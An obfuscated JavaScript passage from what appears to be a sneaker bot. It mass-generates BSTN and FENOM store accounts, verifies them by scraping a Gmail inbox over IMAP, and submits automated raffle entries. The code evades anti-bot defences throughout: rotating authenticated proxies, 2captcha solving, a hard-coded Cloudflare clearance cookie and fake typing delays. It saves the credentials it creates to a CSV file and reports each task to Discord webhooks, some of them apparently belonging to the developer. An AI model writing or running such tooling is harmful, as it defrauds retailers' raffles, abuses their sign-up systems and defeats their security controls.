                    for (var _0x2da0e2 = 0x0; _0x2da0e2 < _0x1c0b3a['length']; _0x2da0e2++) {
                        if (_0x1e2138 != 'yes')
                            var _0x1e2138 = '', _0x5d3b23 = 0x0;
                        var _0x45a66c;
                        await _0x38eff1(_0x1c0b3a, _0x2da0e2), _0x535b9c(_0x113ec2['name'] + '\x20Task\x20' + (_0x2da0e2 + 0x1) + '\x20/\x20' + _0x1c0b3a['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d);
                        var _0x587fb1 = await _0x1487ea(_0x1c0b3a[_0x2da0e2], _0x113ec2, 'acc', ![]);
                        const _0xe3204b = { 'succesDEVMSG': { 'embeds': [_0x587fb1] } }, _0x21f83e = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x24e8ae = Math['round'](Math['random']() * (_0x3a0502['length'] - 0x1)), _0x1aa0eb = _0x3a0502[_0x24e8ae]['split'](':');
                        const _0x24dd97 = await _0x4e5975['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1aa0eb[0x0] + ':' + _0x1aa0eb[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x5289b1 = await _0x24dd97['newPage']();
                            await _0x5289b1['authenticate']({
                                'username': '' + _0x1aa0eb[0x2],
                                'password': '' + _0x1aa0eb[0x3]
                            }), console['log'](_0x207f7e() + '\x20[' + _0x113ec2['name'] + ']\x20Task\x20' + (_0x2da0e2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5289b1['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5289b1['setRequestInterception'](!![]), _0x5289b1['on']('request', _0x266221 => {
                                _0x266221['resourceType']() === 'image' ? _0x266221['abort']() : _0x266221['continue']();
                            }), await _0x5289b1['goto']('' + _0x21f83e), await _0x5289b1['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x5289b1['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x207f7e() + '\x20[' + _0x113ec2['name'] + ']\x20Task\x20' + (_0x2da0e2 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x2bc7d2(0x7d0), console['log'](_0x207f7e() + '\x20[' + _0x113ec2['name'] + ']\x20Task\x20' + (_0x2da0e2 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x2bc7d2(0x190), await _0x5289b1['waitForSelector']('#firstname'), await _0x5289b1['type']('#firstname', _0x1c0b3a[_0x2da0e2]['FirstName'], { 'delay': 0xf0 }), await _0x2bc7d2(0x190), await _0x5289b1['type']('#lastname', _0x1c0b3a[_0x2da0e2]['LastName'], { 'delay': 0xe6 }), await _0x2bc7d2(0x190), await _0x5289b1['type']('#email_address', _0x1c0b3a[_0x2da0e2]['Email'], { 'delay': 0x122 }), await _0x2bc7d2(0x190), await _0x5289b1['type']('#password', _0x1c0b3a[_0x2da0e2]['Password'], { 'delay': 0x82 }), await _0x2bc7d2(0x1f4), await _0x5289b1['type']('#password-confirmation', _0x1c0b3a[_0x2da0e2]['Password'], { 'delay': 0x7c }), console['log'](_0x207f7e() + '\x20[' + _0x113ec2['name'] + ']\x20Task\x20' + (_0x2da0e2 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x2bc7d2(0x2bc), await _0x5289b1['$eval']('#form-validate', _0x5c6e0c => _0x5c6e0c['submit']()), await _0x2bc7d2(0x1388);
                            const _0x390054 = await _0x5289b1['$']('#email_address-error');
                            if (_0x390054)
                                throw new Error('Invalid\x20Email');
                            const _0x39176d = await _0x5289b1['$']('#password-error');
                            if (_0x39176d)
                                throw new Error('Invalid\x20Password');
                            await _0x5289b1['waitForSelector']('div.mesg-success'), _0x1e2138 = 'no', console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x113ec2['name'] + ']\x20Task\x20' + (_0x2da0e2 + 0x1) + '\x20:\x20Account\x20' + _0x1c0b3a[_0x2da0e2]['Email'] + '\x20Generated')), _0xd8dc96['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x1c0b3a[_0x2da0e2]['Email'] + ',' + _0x1c0b3a[_0x2da0e2]['Password']);
                            try {
                                _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0xe3204b['succesDEVMSG']);
                            } catch {
                            }
                            await _0x5e696c(_0x29936e, _0xe3204b['succesDEVMSG']), console['log'](_0x49dcd4['yellow'](_0x207f7e() + '\x20[' + _0x113ec2['name'] + ']\x20Task\x20' + (_0x2da0e2 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x2df56c) {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x113ec2['name'] + ']\x20Task\x20' + (_0x2da0e2 + 0x1) + '\x20:\x20' + _0x2df56c)), _0x45a66c = '' + _0x2df56c;
                            var _0x242d64 = await _0x1487ea(_0x1c0b3a[_0x2da0e2], _0x113ec2, 'acc', !![], _0x45a66c);
                            _0xe3204b['errorDEV'] = { 'embeds': [_0x242d64] }, _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0xe3204b['errorDEV']), await _0x5e696c(_0x8997ff, _0xe3204b['errorDEV']), _0x1e2138 = 'yes';
                        } finally {
                            _0x24dd97['close']();
                            if (_0x1e2138 == 'yes' && _0x5d3b23 != 0x5) {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x113ec2['name'] + ']\x20Task\x20' + (_0x2da0e2 + 0x1) + '\x20:\x20Retrying')), _0x2da0e2 = _0x2da0e2 - 0x1, _0x5d3b23 = _0x5d3b23 + 0x1;
                                continue;
                            }
                            _0x1e2138 == 'yes' && _0x5d3b23 >= 0x5 && (_0x4b302f(_0x1c0b3a[_0x2da0e2], _0x113ec2), _0x1e2138 = 'no', _0x5d3b23 = 0x0), console['log'](_0x207f7e() + '\x20[' + _0x113ec2['name'] + ']\x20Waiting\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x384498, _0x323859) {
                    var _0x59d8eb = [];
                    async function _0x33fe69() {
                        var _0x380dd0 = new _0x91ddb5({
                            'user': _0x397a11['masterMail'],
                            'password': _0x397a11['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x297e2d(_0x32659b) {
                            _0x380dd0['openBox']('INBOX', ![], _0x32659b);
                        }
                        _0x380dd0['once']('ready', function () {
                            _0x297e2d(function (_0x4fb903, _0x2b40a0) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x4fb903)
                                    throw _0x4fb903;
                                _0x380dd0['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'FROM',
                                        'no-reply@store.bstn.com'
                                    ]
                                ], function (_0x52a28c, _0x21db57) {
                                    if (!_0x21db57 || !_0x21db57['length'])
                                        console['log'](_0x207f7e() + '\x20[' + _0x384498['name'] + ']\x20No\x20mails\x20found'), _0x380dd0['end']();
                                    else {
                                        var _0x1c83f0 = _0x380dd0['seq']['fetch'](_0x21db57, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x1c83f0['on']('message', function (_0x100d96, _0x3c61e6) {
                                            var _0x37276f = '(#' + _0x3c61e6 + ')\x20';
                                            _0x100d96['on']('body', function (_0x321f90, _0x451be6) {
                                                _0x3631ef(_0x321f90, (_0xe920ff, _0x155377) => {
                                                    if (_0x155377['subject'] == 'Please\x20confirm\x20your\x20BSTN\x20Store\x20account') {
                                                        var _0xe73278 = _0x155377['text']['split']('[')[0x2], _0x29e844 = _0xe73278['split'](']')[0x0], _0x27c3f5 = _0x155377['html']['split']('\x0a');
                                                        _0x59d8eb['push'](_0x29e844);
                                                    }
                                                });
                                            }), _0x100d96['once']('end', function () {
                                            });
                                        }), _0x1c83f0['once']('error', function (_0x548b6c) {
                                            console['log']('Fetch\x20error:\x20' + _0x548b6c);
                                        }), _0x1c83f0['once']('end', function () {
                                            _0x380dd0['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x380dd0['once']('error', function (_0x415bb2) {
                            console['log'](_0x49dcd4['red'](_0x415bb2['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x380dd0['once']('end', async function () {
                        }), _0x380dd0['connect']();
                    }
                    async function _0x28ec73(_0x29bf34, _0x4e2a91, _0x3107b0) {
                        _0x4e5975['use'](_0x10339b());
                        for (var _0x49db04 = 0x0; _0x49db04 < _0x4e2a91['length']; _0x49db04++) {
                            if (_0xcb1f7c != 'yes')
                                var _0xcb1f7c = '', _0x251854 = 0x0;
                            var _0x3c9952 = Math['round'](Math['random']() * (_0x3107b0['length'] - 0x1)), _0x280153 = _0x3107b0[_0x3c9952]['split'](':');
                            const _0x385160 = await _0x4e5975['launch']({
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x280153[0x0] + ':' + _0x280153[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                            try {
                                const _0x2d844f = await _0x385160['newPage']();
                                await _0x2d844f['authenticate']({
                                    'username': '' + _0x280153[0x2],
                                    'password': '' + _0x280153[0x3]
                                }), console['log'](_0x207f7e() + '\x20[' + _0x29bf34['name'] + ']\x20Task\x20' + (_0x49db04 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x2d844f['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2d844f['setRequestInterception'](!![]), _0x2d844f['on']('request', _0x1e327c => {
                                    _0x1e327c['resourceType']() === 'image' || _0x1e327c['resourceType']() === 'font' || _0x1e327c['resourceType']() === 'media' ? _0x1e327c['abort']() : _0x1e327c['continue']();
                                }), console['log'](_0x207f7e() + '\x20[' + _0x29bf34['name'] + ']\x20Task\x20' + (_0x49db04 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2d844f['goto'](_0x4e2a91[_0x49db04]), console['log'](_0x207f7e() + '\x20[' + _0x29bf34['name'] + ']\x20Task\x20' + (_0x49db04 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x2d844f['waitForTimeout'](0xbb8);
                                try {
                                    await _0x2d844f['waitForSelector']('.account-nav'), _0xcb1f7c = 'no', console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x29bf34['name'] + ']\x20Task\x20' + (_0x49db04 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x36d52c = await _0x1487ea(null, _0x29bf34, 'ver', ![]);
                                    const _0x1ed64d = { 'succesDEVMSG': { 'embeds': [_0x36d52c] } };
                                    await _0x5e696c(_0x496075, _0x1ed64d['succesDEVMSG']);
                                } catch (_0x140471) {
                                    throw new Error(_0x140471);
                                }
                            } catch (_0x1f2405) {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x29bf34['name'] + ']\x20Task\x20' + (_0x49db04 + 0x1) + '\x20:\x20' + _0x1f2405));
                                var _0xb5ae89 = _0x1f2405, _0x202ba5 = await _0x1487ea(null, _0x29bf34, 'ver', !![], _0xb5ae89);
                                const _0x303616 = { 'errorDEVMSG': { 'embeds': [_0x202ba5] } };
                                _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x303616['errorDEVMSG']), await _0x5e696c(_0x8997ff, _0x303616['errorDEVMSG']), _0xcb1f7c = 'yes';
                            } finally {
                                _0x385160['close']();
                                if (_0xcb1f7c == 'yes' && _0x251854 != 0x5) {
                                    console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x29bf34['name'] + ']\x20Task\x20' + (_0x49db04 + 0x1) + '\x20:\x20Retrying')), _0x49db04 = _0x49db04 - 0x1, _0x251854 = _0x251854 + 0x1;
                                    continue;
                                }
                                _0xcb1f7c == 'yes' && _0x251854 >= 0x5 && (_0xcb1f7c = 'no', _0x251854 = 0x0), console['log'](_0x207f7e() + '\x20[' + _0x29bf34['name'] + ']\x20Waiting\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                            }
                        }
                    }
                    try {
                        _0x33fe69(), await _0x2bc7d2(0xfa0), console['log']('Found\x20' + _0x59d8eb['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x2bc7d2(0x7d0);
                    }
                    await _0x28ec73(_0x384498, _0x59d8eb, _0x323859);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x13341b, _0x3ae2d9, _0x33ff02) {
                    _0x4e5975['use'](_0x10339b()), _0x4e5975['use'](_0x2e6420({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x397a11['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4e6ff3 = 0x0; _0x4e6ff3 < _0x3ae2d9['length']; _0x4e6ff3++) {
                        var _0x494275;
                        await _0x38eff1(_0x3ae2d9, _0x4e6ff3);
                        if (_0x3a6bc1 != 'yes')
                            var _0x3a6bc1 = '', _0x5a0073 = 0x0;
                        _0x535b9c(_0x13341b['name'] + '\x20Task\x20' + (_0x4e6ff3 + 0x1) + '\x20/\x20' + _0x3ae2d9['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d);
                        var _0x3bd9dd = Math['round'](Math['random']() * (_0x33ff02['length'] - 0x1)), _0x4ee1f6 = _0x33ff02[_0x3bd9dd]['split'](':'), _0x12385c;
                        try {
                            _0x12385c = await _0x4e5975['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4ee1f6[0x0] + ':' + _0x4ee1f6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x12385c = await _0x4e5975['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4ee1f6[0x0] + ':' + _0x4ee1f6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1742b3 = await _0x12385c['newPage'](), _0x83398c = await _0x1742b3['target']()['createCDPSession'](), { windowId: _0x10a6a7 } = await _0x83398c['send']('Browser.getWindowForTarget');
                            await _0x1742b3['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x5aaf7b = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x1742b3['authenticate']({
                                'username': '' + _0x4ee1f6[0x2],
                                'password': '' + _0x4ee1f6[0x3]
                            }), console['log'](_0x207f7e() + '\x20[' + _0x13341b['name'] + ']\x20Task\x20' + (_0x4e6ff3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1742b3['goto']('' + _0x3ae2d9[_0x4e6ff3]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x207f7e() + '\x20[' + _0x13341b['name'] + ']\x20Task\x20' + (_0x4e6ff3 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x1742b3['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x83398c['send']('Browser.setWindowBounds', {
                                'windowId': _0x10a6a7,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x2bc7d2(0x1388), await _0x1742b3['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1742b3['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x2bc7d2(0x1f4), console['log'](_0x207f7e() + '\x20[' + _0x13341b['name'] + ']\x20Task\x20' + (_0x4e6ff3 + 0x1) + '\x20:\x20Logging\x20in'), await _0x1742b3['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x553235 => _0x553235['click']()), await _0x1742b3['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x1742b3['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x2bc7d2(0x7d0), await _0x1742b3['waitForSelector']('#email-login'), await _0x1742b3['type']('#email-login', '' + _0x3ae2d9[_0x4e6ff3]['Email']), await _0x2bc7d2(0xdac), await _0x1742b3['waitForSelector']('#password'), await _0x1742b3['type']('#password', '' + _0x3ae2d9[_0x4e6ff3]['Password'], { 'delay': 0xe6 }), await _0x2bc7d2(0x157c);
                            try {
                                await _0x1742b3['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0xfe065c => _0xfe065c['click']());
                            } catch {
                            }
                            try {
                                await _0x1742b3['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0xb81246) {
                            }
                            await _0x2bc7d2(0x3e8);
                            const _0x5061f4 = await _0x1742b3['$']('.enteredDraw_container__2KmQ_');
                            if (_0x5061f4)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x207f7e() + '\x20[' + _0x13341b['name'] + ']\x20Task\x20' + (_0x4e6ff3 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x3ae2d9[_0x4e6ff3]['Size']);
                            if (_0x3ae2d9[_0x4e6ff3]['Size'] != 'RANDOM') {
                                var _0x4cf95f = _0x3ae2d9[_0x4e6ff3]['Size']['replace']('.', ',');
                                const _0x3a9aac = await _0x1742b3['$x']('//div[contains(text(),\x20' + _0x4cf95f + ')]');
                                await _0x3a9aac[0x0]['click']();
                            } else {
                                const _0x17667e = await _0x1742b3['$$']('div.swatchTile_tile__IRH9Q');
                                var _0x5bce6d = Math['round'](Math['random']() * (_0x17667e['length'] - 0x1));
                                await _0x17667e[_0x5bce6d]['click']();
                            }
                            await _0x2bc7d2(0x1f4);
                            const _0x59749a = await _0x1742b3['$']('.addressList_addressItem__LE2PB');
                            if (_0x59749a && _0x3ae2d9[_0x4e6ff3]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x207f7e() + '\x20[' + _0x13341b['name'] + ']\x20Task\x20' + (_0x4e6ff3 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x1742b3['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x2bc7d2(0x5dc), await _0x1742b3['waitForSelector']('#firstname'), await _0x1742b3['type']('#firstname', '' + _0x3ae2d9[_0x4e6ff3]['FirstName']), await _0x2bc7d2(0x1f4), await _0x1742b3['waitForSelector']('#firstname'), await _0x1742b3['type']('#lastname', '' + _0x3ae2d9[_0x4e6ff3]['LastName']), await _0x2bc7d2(0x1f4), await _0x1742b3['waitForSelector']('#firstname'), await _0x1742b3['type']('#street', '' + _0x3ae2d9[_0x4e6ff3]['Address1']), await _0x2bc7d2(0x1f4), await _0x1742b3['waitForSelector']('#firstname'), await _0x1742b3['type']('#houseNumber', _0x3ae2d9[_0x4e6ff3]['HouseNumber'] + '\x20' + _0x3ae2d9[_0x4e6ff3]['Address2']), await _0x2bc7d2(0x1f4), await _0x1742b3['waitForSelector']('#firstname'), await _0x1742b3['select']('#country_code', '' + _0x3ae2d9[_0x4e6ff3]['Country']), await _0x2bc7d2(0x1f4), await _0x1742b3['type']('#postcode', '' + _0x3ae2d9[_0x4e6ff3]['Zip']), await _0x2bc7d2(0x1f4), await _0x1742b3['type']('#city', '' + _0x3ae2d9[_0x4e6ff3]['City']), await _0x2bc7d2(0x1f4), await _0x1742b3['type']('#telephone', '' + _0x3ae2d9[_0x4e6ff3]['Phone']), await _0x2bc7d2(0x1f4), await _0x1742b3['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x2bc7d2(0x9c4);
                            try {
                                await _0x1742b3['type']('#instagram_name', '' + _0x3ae2d9[_0x4e6ff3]['Follower']), await _0x1742b3['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x207f7e() + '\x20[' + _0x13341b['name'] + ']\x20Task\x20' + (_0x4e6ff3 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x2bc7d2(0x5dc);
                            try {
                                await _0x1742b3['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x2bc7d2(0x5dc), await _0x1742b3['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x204a1d => _0x204a1d['click']()), await _0x2bc7d2(0x1388);
                            try {
                                await _0x1742b3['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x1742b3['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x3ae2d9[_0x4e6ff3]['Size'] != 'RANDOM') {
                                    var _0x4cf95f = _0x3ae2d9[_0x4e6ff3]['Size']['replace']('.', ',');
                                    const _0x137b4d = await _0x1742b3['$x']('//div[contains(text(),\x20' + _0x4cf95f + ')]');
                                    await _0x137b4d[0x0]['click']();
                                } else {
                                    const _0x5680a6 = await _0x1742b3['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x5bce6d = Math['round'](Math['random']() * (_0x5680a6['length'] - 0x1));
                                    await _0x5680a6[_0x5bce6d]['click']();
                                }
                                await _0x2bc7d2(0x5dc);
                                try {
                                    await _0x1742b3['hover']('#instagram_name'), await _0x1742b3['type']('#instagram_name', '' + _0x3ae2d9[_0x4e6ff3]['Follower']), await _0x1742b3['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x207f7e() + '\x20[' + _0x13341b['name'] + ']\x20Task\x20' + (_0x4e6ff3 + 0x1) + '\x20:\x20Retrying'), await _0x1742b3['hover']('.checkBox_boxHolder__wLGVe'), await _0x2bc7d2(0x5dc), await _0x1742b3['click']('.checkBox_boxHolder__wLGVe'), await _0x2bc7d2(0x157c), await _0x1742b3['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x5a1ba4 => _0x5a1ba4['click']()), await _0x2bc7d2(0x1388), await _0x1742b3['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x3a6bc1 = 'no', _0x1560d5(_0x3ae2d9[_0x4e6ff3], _0x13341b), console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x13341b['name'] + ']\x20Task\x20' + (_0x4e6ff3 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x4c0e79 = await _0x1487ea(_0x3ae2d9[_0x4e6ff3], _0x13341b, 'dev', ![]), _0x15a914 = await _0x1487ea(_0x3ae2d9[_0x4e6ff3], _0x13341b, 'pub', ![]);
                            const _0x5df46f = {
                                'succesDEVMSG': { 'embeds': [_0x4c0e79] },
                                'succesPUBMSG': { 'embeds': [_0x15a914] }
                            };
                            try {
                                _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x5df46f['succesDEVMSG']), await _0x2bc7d2(0xc8), await _0x5e696c(_0x171351, _0x5df46f['succesDEVMSG']), await _0x2bc7d2(0xc8), await _0x5e696c(_0x3ebea8, _0x5df46f['succesPUBMSG']);
                            } catch (_0x31df24) {
                                console['log'](_0x49dcd4['yellow'](_0x207f7e() + '\x20[' + _0x13341b['name'] + ']\x20Task\x20' + (_0x4e6ff3 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x31df24));
                            }
                        } catch (_0x25b8db) {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x13341b['name'] + ']\x20Task\x20' + (_0x4e6ff3 + 0x1) + '\x20:\x20' + _0x25b8db)), _0x3a6bc1 = 'yes', _0x494275 = '' + _0x25b8db;
                            var _0x3f81bd = await _0x1487ea(_0x3ae2d9[_0x4e6ff3], _0x13341b, 'dev', !![], _0x494275), _0x4c0e79 = await _0x1487ea(_0x3ae2d9[_0x4e6ff3], _0x13341b, 'dev', ![]), _0x15a914 = await _0x1487ea(_0x3ae2d9[_0x4e6ff3], _0x13341b, 'pub', ![]);
                            const _0x1b6836 = {
                                'succesDEVMSG': { 'embeds': [_0x4c0e79] },
                                'succesPUBMSG': { 'embeds': [_0x15a914] }
                            };
                            _0x1b6836['errorDEV'] = { 'embeds': [_0x3f81bd] }, _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x1b6836['errorDEV']), await _0x5e696c(_0x8997ff, _0x1b6836['errorDEV']);
                        } finally {
                            _0x12385c['close']();
                            if (_0x3a6bc1 == 'yes' && _0x5a0073 != 0x5) {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x13341b['name'] + ']\x20Task\x20' + (_0x4e6ff3 + 0x1) + '\x20:\x20Retrying')), _0x4e6ff3 = _0x4e6ff3 - 0x1, _0x5a0073 = _0x5a0073 + 0x1;
                                continue;
                            }
                            _0x3a6bc1 == 'yes' && _0x5a0073 >= 0x5 && (_0x4b302f(_0x3ae2d9[_0x4e6ff3], _0x13341b), _0x3a6bc1 = 'no', _0x5a0073 = 0x0), console['log'](_0x207f7e() + '\x20[' + _0x13341b['name'] + ']\x20Waiting\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x4bbe96, _0xa25fc8, _0x3c933f) {
                    _0x4e5975['use'](_0x10339b()), _0x4e5975['use'](_0x2e6420({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x397a11['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3e1afe = 0x0; _0x3e1afe < _0xa25fc8['length']; _0x3e1afe++) {
                        if (_0x2f0e06 != 'yes')
                            var _0x2f0e06 = '', _0xe0fad6 = 0x0;
                        var _0x323cd2;
                        await _0x38eff1(_0xa25fc8, _0x3e1afe), _0x535b9c(_0x4bbe96['name'] + '\x20Task\x20' + (_0x3e1afe + 0x1) + '\x20/\x20' + _0xa25fc8['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d);
                        var _0x2dee2f = await _0x1487ea(_0xa25fc8[_0x3e1afe], _0x4bbe96, 'acc', ![]);
                        const _0x4d68be = { 'succesDEVMSG': { 'embeds': [_0x2dee2f] } }, _0x5d10c2 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x22bfea = Math['round'](Math['random']() * (_0x3c933f['length'] - 0x1)), _0x18bd0a = _0x3c933f[_0x22bfea]['split'](':'), _0x3cd655;
                        try {
                            _0x3cd655 = await _0x4e5975['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x18bd0a[0x0] + ':' + _0x18bd0a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3cd655 = await _0x4e5975['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x18bd0a[0x0] + ':' + _0x18bd0a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x333ee6 = await _0x3cd655['newPage']();
                            await _0x333ee6['setViewport']({
                                'width': 0x500 + _0xeb0183(0x1, 0x32),
                                'height': 0x2d9 + _0xeb0183(0x1, 0x32)
                            });
                            const _0x2dd1f = await _0x333ee6['target']()['createCDPSession'](), { windowId: _0x4a8ac2 } = await _0x2dd1f['send']('Browser.getWindowForTarget');
                            await _0x333ee6['authenticate']({
                                'username': '' + _0x18bd0a[0x2],
                                'password': '' + _0x18bd0a[0x3]
